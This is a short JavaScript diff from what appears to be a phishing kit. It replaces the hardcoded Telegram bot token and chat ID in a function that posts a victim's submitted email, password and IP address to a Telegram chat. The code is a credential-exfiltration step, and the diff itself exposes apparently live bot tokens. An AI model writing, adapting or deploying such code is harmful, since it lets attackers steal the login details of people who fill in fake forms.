@@ -1,7 +1,7 @@
 // Function to send form data and user's IP address to Telegram
 function sendFormToTelegram(email, password, ip) {
-  const botToken = "6330855098:AAF9Woyj6INDb7eSlONuV8tajhxsuVo1xrw"; // Replace with your Telegram bot token
-  const chatId = "6372958816"; // Replace with your Telegram chat ID
+  const botToken = "7541685520:AAF52n9neE2wbpdC-wBuiNqTWgZshk-eCc8"; // Replace with your Telegram bot token
+  const chatId = "1152490940"; // Replace with your Telegram chat ID
 
   const message = `New form submission:\n\n__Name__: ${email}\n__Email__: ${password}\n__IP__: ${ip}`;
 
